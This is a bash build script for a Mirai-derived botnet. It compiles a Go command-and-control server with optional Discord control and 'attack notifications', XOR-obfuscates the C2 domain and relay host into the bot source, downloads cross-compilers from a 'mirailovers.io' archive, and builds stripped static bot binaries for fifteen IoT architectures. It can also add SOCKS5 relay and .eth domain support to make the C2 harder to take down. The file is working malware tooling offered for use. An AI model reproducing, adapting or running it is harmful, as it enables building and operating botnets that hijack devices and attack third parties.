#!/bin/bash

GRAY='\033[90m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%I:%M %p')
    
    case "$level" in
        INFO)
            echo -e "${GRAY}${timestamp} ${GREEN}INFO${RESET} ${message}"
            ;;
        WARN)
            echo -e "${GRAY}${timestamp} ${YELLOW}WARN${RESET} ${message}"
            ;;
        ERROR)
            echo -e "${GRAY}${timestamp} ${RED}ERROR${RESET} ${message}"
            ;;
        DEBUG)
            echo -e "${GRAY}${timestamp} ${BLUE}DEBUG${RESET} ${message}"
            ;;
        *)
            echo -e "${GRAY}${timestamp} ${GREEN}${level}${RESET} ${message}"
            ;;
    esac
}

CNC_DOMAIN=""
USE_ENS=0
USE_RELAY=0
RELAY_HOST=""
RELAY_PORT="1080"
USE_DISCORD=0
DISCORD_TOKEN=""
DISCORD_PREFIX="!"
DISCORD_NOTIFICATION_CHANNEL=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain)
            CNC_DOMAIN="$2"
            shift 2
            ;;
        -e|--ens)
            USE_ENS=1
            shift
            ;;
        -r|--relay)
            USE_RELAY=1
            RELAY_HOST="$2"
            shift 2
            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
                RELAY_PORT="$1"
                shift
            fi
            ;;
        --relay-port)
            RELAY_PORT="$2"
            shift 2
            ;;
        --discord)
            USE_DISCORD=1
            DISCORD_TOKEN="$2"
            shift 2
            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
                DISCORD_NOTIFICATION_CHANNEL="$1"
                shift
            fi
            ;;
        --discord-prefix)
            DISCORD_PREFIX="$2"
            shift 2
            ;;
        --discord-channel)
            DISCORD_NOTIFICATION_CHANNEL="$2"
            shift 2
            ;;
        *)
            log ERROR "Unknown option: $1"
            echo "Usage: $0 --domain <domain> [-e|--ens] [-r <relay_host> [relay_port]] [--discord <bot_token> [notification_channel_id]]"
            echo "       --ens: Compile bots with ENS (Ethereum Name Service) support"
            echo "              Allows using .eth domains like yourname.eth"
            echo "       -r, --relay: Enable relay mode. Bots connect via SOCKS5 relay"
            echo "              Example: -r relay.example.com 1080"
            echo "       --relay-port <port>: Set relay port (default: 1080)"
            echo "       --discord <bot_token> [notification_channel_id]: Enable Discord bot"
            echo "              bot_token: Your Discord bot token from Developer Portal"
            echo "              notification_channel_id: (optional) Channel ID for attack notifications"
            echo "       --discord-prefix <prefix>: Set Discord command prefix (default: !)"
            echo "       --discord-channel <channel_id>: Set Discord notification channel ID"
            exit 1
            ;;
    esac
done

if [ -z "$CNC_DOMAIN" ]; then
    log WARN "Domain is required. Usage: $0 --domain <domain>"
    exit 1
fi

if [ "$EUID" -ne 0 ]; then
    log ERROR "Please execute as root"
    exit 1
fi

if [ ! -f /etc/os-release ]; then
    log ERROR "Unsupported OS"
    exit 1
fi

source /etc/os-release
if [ "$ID" != "ubuntu" ]; then
    log ERROR "This script only supports Ubuntu (found $ID)"
    exit 1
fi

log INFO "Running on Ubuntu $VERSION_ID as root"

export DEBIAN_FRONTEND=noninteractive

log INFO "Installing required packages"
apt-get update -yq >/dev/null 2>&1
apt-get install -yq wget unzip gcc snapd screen bzip2 python3 >/dev/null 2>&1

if ! command -v go &> /dev/null; then
    log INFO "Installing Go via snap"
    snap install go --classic >/dev/null 2>&1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$SCRIPT_DIR/build_env"

log INFO "Using local source files in $SCRIPT_DIR"
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"

# Copy source files to build environment
cp -r "$SCRIPT_DIR/bot" "$WORK_DIR/bot"
cp -r "$SCRIPT_DIR/cnc" "$WORK_DIR/cnc"
cd "$WORK_DIR"

log INFO "Building CNC"
cd cnc

log INFO "Downloading Go dependencies (this may take a moment)..."
go mod tidy > /tmp/cnc_mod_tidy.log 2>&1
if [ $? -ne 0 ]; then
    log ERROR "go mod tidy failed!"
    cat /tmp/cnc_mod_tidy.log | while IFS= read -r line; do log ERROR "  $line"; done
    exit 1
fi

if [ "$USE_DISCORD" -eq 1 ]; then
    log INFO "Fetching Discord Go library..."
    go get github.com/bwmarrin/discordgo@v0.28.1 > /tmp/cnc_discord_get.log 2>&1
    if [ $? -ne 0 ]; then
        log ERROR "Failed to fetch Discord dependency!"
        cat /tmp/cnc_discord_get.log | while IFS= read -r line; do log ERROR "  $line"; done
        exit 1
    fi
fi

log INFO "Compiling CNC binary..."
go build -o cnc main.go > /tmp/cnc_build.log 2>&1
if [ $? -ne 0 ]; then
    log ERROR "CNC build failed!"
    log ERROR "  --- Build errors ---"
    cat /tmp/cnc_build.log | while IFS= read -r line; do log ERROR "  $line"; done
    exit 1
fi

log INFO "CNC binary built successfully ($(du -h cnc | cut -f1))"
log INFO "You can start the CNC manually with: screen -dmS cnc ./cnc"

# Configure Discord bot if enabled
if [ "$USE_DISCORD" -eq 1 ] && [ -n "$DISCORD_TOKEN" ]; then
    log INFO "Configuring Discord bot in config.json..."
    CONFIG_FILE="$WORK_DIR/cnc/assets/config.json"
    
    # Note: adminId and allowedChannel must be set manually in config.json after setup
    # Run the CNC once, check the logs for your Discord user/channel IDs, then edit config.json
    python3 -c "
import json
with open('$CONFIG_FILE', 'r') as f:
    data = json.load(f)
data['discord']['enabled'] = True
data['discord']['botToken'] = '$DISCORD_TOKEN'
data['discord']['prefix'] = '$DISCORD_PREFIX'
if '$DISCORD_NOTIFICATION_CHANNEL':
    data['discord']['notificationChannel'] = '$DISCORD_NOTIFICATION_CHANNEL'
    data['discord']['allowedChannel'] = '$DISCORD_NOTIFICATION_CHANNEL'
with open('$CONFIG_FILE', 'w') as f:
    json.dump(data, f, indent=2)
" 2>/tmp/discord_config.log
    if [ $? -ne 0 ]; then
        log ERROR "Failed to configure Discord in config.json!"
        cat /tmp/discord_config.log | while IFS= read -r line; do log ERROR "  $line"; done
    else
        log INFO "Discord bot configured with token and prefix '$DISCORD_PREFIX'"
        log WARN "You still need to set 'adminId' in config.json to your Discord user ID (as a string)"
        log WARN "Example: \"adminId\": \"331806498286206976\""
    fi
fi

log INFO "Updating bot configuration"
cd "$WORK_DIR"

# Check if domain ends with .eth
if [[ "$CNC_DOMAIN" == *.eth ]]; then
    log INFO "ENS domain detected: $CNC_DOMAIN"
    USE_ENS=1
fi

# Generate XOR-obfuscated table entry for the CNC domain
log INFO "Generating encrypted table entry for domain: $CNC_DOMAIN"
python3 "$SCRIPT_DIR/generate_table.py" "$CNC_DOMAIN" > /tmp/table_entry.txt 2>&1
# Extract just the actual add_entry() code line (starts with spaces + add_entry, not comments)
TABLE_ENTRY=$(grep "^    add_entry" /tmp/table_entry.txt | head -1)
if [ -z "$TABLE_ENTRY" ]; then
    log ERROR "Failed to generate table entry for domain! Check generate_table.py or python3 installation."
    log ERROR "Contents of /tmp/table_entry.txt:"
    cat /tmp/table_entry.txt
    exit 1
fi
sed -i "s|^.*TABLE_CNC_DOMAIN.*|$TABLE_ENTRY|" bot/table.c
log INFO "CNC domain encrypted in table.c"

# Generate encrypted entry for single relay
if [ "$USE_RELAY" -eq 1 ] && [ -n "$RELAY_HOST" ]; then
    log INFO "Generating encrypted relay entry for: $RELAY_HOST"
    
    # Clear all relay entries first
    for rel_idx in 1 2 3 4; do
        sed -i "s|^.*TABLE_RELAY_${rel_idx}.*|    add_entry(TABLE_RELAY_${rel_idx}, \"\", 1);|" bot/table.c
    done
    
    python3 "$SCRIPT_DIR/generate_table.py" "$RELAY_HOST" > /tmp/relay_entry.txt 2>&1
    RELAY_ENTRY=$(grep "^    add_entry" /tmp/relay_entry.txt | head -1)
    if [ -z "$RELAY_ENTRY" ]; then
        log ERROR "Failed to generate table entry for relay $RELAY_HOST! Contents:"
        cat /tmp/relay_entry.txt
        exit 1
    fi
    sed -i "s|^.*TABLE_RELAY_1.*|$RELAY_ENTRY|" bot/table.c
    log INFO "  Relay: $RELAY_HOST encrypted"
    
    # Set the relay port in includes.h
    if [ "$RELAY_PORT" != "1080" ]; then
        sed -i "s/#define RELAY_PORT 1080/#define RELAY_PORT $RELAY_PORT/" bot/includes.h
        log INFO "  Relay port set to: $RELAY_PORT"
    fi
fi

# For ENS domains, the .eth.link gateway handles the actual resolution
# The encrypted domain in table.c still stores the original .eth domain
if [ "$USE_ENS" -eq 1 ]; then
    log INFO "ENS support enabled. Bots will resolve .eth domains via eth.link DNS gateway"
fi

log INFO "Preparing cross-compilers"
mkdir -p /etc/xcompile
cd /etc/xcompile

download_compiler() {
    local arch="$1"
    if [ ! -d "/etc/xcompile/$arch" ]; then
        log INFO "Downloading $arch compiler"
        wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2" 2>/tmp/compiler_dl_error.txt
        if [ $? -eq 0 ]; then
            tar -xjf "$arch.tar.bz2" >/dev/null 2>&1
            if [ $? -ne 0 ]; then
                log ERROR "Failed to extract $arch compiler archive (may be corrupted)"
                rm -f "$arch.tar.bz2"
                return 1
            fi
            mv "cross-compiler-$arch" "$arch"
            rm -f "$arch.tar.bz2"
        else
            log WARN "Failed to download $arch compiler"
            log WARN "  Download error: $(cat /tmp/compiler_dl_error.txt)"
            log WARN "  You can manually place cross-compilers in /etc/xcompile/$arch/"
        fi
    fi
}

download_compiler "armv4l"
download_compiler "armv5l"
download_compiler "armv6l"
download_compiler "armv7l"
download_compiler "armv8l"
download_compiler "mips"
download_compiler "mipsel"
download_compiler "i586"
download_compiler "i686"
download_compiler "x86_64"
download_compiler "sh4"
download_compiler "powerpc"
download_compiler "powerpc440"
download_compiler "m68k"
download_compiler "sparc"

cd "$WORK_DIR"
mkdir -p release

compile_bot() {
    local arch="$1"
    local output="$2"
    local flags="$3"
    local compiler="/etc/xcompile/$arch/bin/$arch-gcc"
    local compiler_check="${arch}-gcc"
    
    if [ ! -f "$compiler" ]; then
        if command -v "$compiler_check" &> /dev/null; then
            compiler="$compiler_check"
        else
            log WARN "Compiler for $arch not found, skipping $output"
            log WARN "  Tried: $compiler and $compiler_check"
            log WARN "  Make sure cross-compiler-$arch is installed in /etc/xcompile/"
            return 1
        fi
    fi
    
    # Check if compiler is actually executable
    if [ ! -x "$(command -v "$compiler" 2>/dev/null || echo "$compiler")" ]; then
        log WARN "Compiler for $arch is not executable, skipping $output"
        return 1
    fi
    
    # Add ENS define if enabled
    if [ "$USE_ENS" -eq 1 ]; then
        flags="$flags -DENS"
    fi
    
    # Add RELAY define if enabled
    if [ "$USE_RELAY" -eq 1 ]; then
        flags="$flags -DRELAY_MODE"
        log INFO "Compiling $output with relay mode (SOCKS5 via ${RELAY_HOSTS[0]:-relay}:$RELAY_PORT)..."
    elif [ "$USE_ENS" -eq 1 ]; then
        log INFO "Compiling $output with ENS support..."
    else
        log INFO "Compiling for $output..."
    fi
    
    compile_log="/tmp/compile_${output}.log"
    "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" > "$compile_log" 2>&1
    
    if [ $? -eq 0 ]; then
        local strip="${compiler%-gcc}-strip"
        if [ -f "$strip" ] || command -v "$strip" &> /dev/null; then
            "$strip" "release/$output" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr > /dev/null 2>&1
        fi
        log INFO "Successfully compiled $output ($(du -h "release/$output" | cut -f1))"
        rm -f "$compile_log"
    else
        log ERROR "Failed to compile $output!"
        log ERROR "  Architecture: $arch"
        log ERROR "  Compiler: $compiler"
        log ERROR "  Flags: -std=c99 $flags"
        log ERROR "  Error log saved to: $compile_log"
        log ERROR "  --- First 20 lines of error output ---"
        head -20 "$compile_log" 2>/dev/null | while IFS= read -r line; do
            log ERROR "  $line"
        done
        log ERROR "  --- Full log available at: $compile_log ---"
    fi
}

# Compile regular builds for all architectures
compile_bot "armv4l" "nerv.arm4" "-static"
compile_bot "armv5l" "nerv.arm5" "-static"
compile_bot "armv6l" "nerv.arm6" "-static"
compile_bot "armv7l" "nerv.arm7" "-static"
compile_bot "armv8l" "nerv.aarch64" "-static"
compile_bot "mips" "nerv.mips" "-static"
compile_bot "mipsel" "nerv.mpsl" "-static"
compile_bot "i586" "nerv.x86" "-static"
compile_bot "i686" "nerv.x86_32" "-static"
compile_bot "x86_64" "nerv.x86_64" "-static"
compile_bot "sh4" "nerv.sh4" "-static"
compile_bot "powerpc" "nerv.ppc" "-static"
compile_bot "powerpc440" "nerv.ppc440" "-static"
compile_bot "m68k" "nerv.m68k" "-static"
compile_bot "sparc" "nerv.sparc" "-static"

# Debug build for testing
compile_bot "x86_64" "nerv.dbg" "-static -DDEBUG"

# If ENS or RELAY is enabled, re-compile with the defines (overwrites with ENS/RELAY-enabled binaries)
if [ "$USE_ENS" -eq 1 ] || [ "$USE_RELAY" -eq 1 ]; then
    EXTRA_FLAGS=""
    MODE_STR=""
    
    if [ "$USE_ENS" -eq 1 ] && [ "$USE_RELAY" -eq 1 ]; then
        EXTRA_FLAGS="-DENS -DRELAY_MODE"
        MODE_STR="ENS + Relay"
    elif [ "$USE_ENS" -eq 1 ]; then
        EXTRA_FLAGS="-DENS"
        MODE_STR="ENS"
    elif [ "$USE_RELAY" -eq 1 ]; then
        EXTRA_FLAGS="-DRELAY_MODE"
        MODE_STR="Relay"
    fi
    
    log INFO "Re-compiling with $MODE_STR support..."
    compile_bot "armv4l" "nerv.arm4" "-static $EXTRA_FLAGS"
    compile_bot "armv5l" "nerv.arm5" "-static $EXTRA_FLAGS"
    compile_bot "armv6l" "nerv.arm6" "-static $EXTRA_FLAGS"
    compile_bot "armv7l" "nerv.arm7" "-static $EXTRA_FLAGS"
    compile_bot "armv8l" "nerv.aarch64" "-static $EXTRA_FLAGS"
    compile_bot "mips" "nerv.mips" "-static $EXTRA_FLAGS"
    compile_bot "mipsel" "nerv.mpsl" "-static $EXTRA_FLAGS"
    compile_bot "i586" "nerv.x86" "-static $EXTRA_FLAGS"
    compile_bot "i686" "nerv.x86_32" "-static $EXTRA_FLAGS"
    compile_bot "x86_64" "nerv.x86_64" "-static $EXTRA_FLAGS"
    compile_bot "sh4" "nerv.sh4" "-static $EXTRA_FLAGS"
    compile_bot "powerpc" "nerv.ppc" "-static $EXTRA_FLAGS"
    compile_bot "powerpc440" "nerv.ppc440" "-static $EXTRA_FLAGS"
    compile_bot "m68k" "nerv.m68k" "-static $EXTRA_FLAGS"
    compile_bot "sparc" "nerv.sparc" "-static $EXTRA_FLAGS"
    compile_bot "x86_64" "nerv.dbg" "-static -DDEBUG $EXTRA_FLAGS"
fi

# Build relay server if requested
if [ "$USE_RELAY" -eq 1 ]; then
    log INFO "Building relay server..."
    cd "$SCRIPT_DIR/relay"
    go build -o "$WORK_DIR/release/relay" -ldflags="-s -w" main.go
    if [ $? -eq 0 ]; then
        log INFO "Relay server built: $WORK_DIR/release/relay"
        log INFO "Run on your relay VPS:"
        log INFO "  ./relay $CNC_DOMAIN 6621 1080"
    else
        log ERROR "Failed to build relay server"
    fi
fi

log INFO "Build process complete"
log INFO "Binaries available in: $WORK_DIR/release/"
ls -lh "$WORK_DIR/release/"
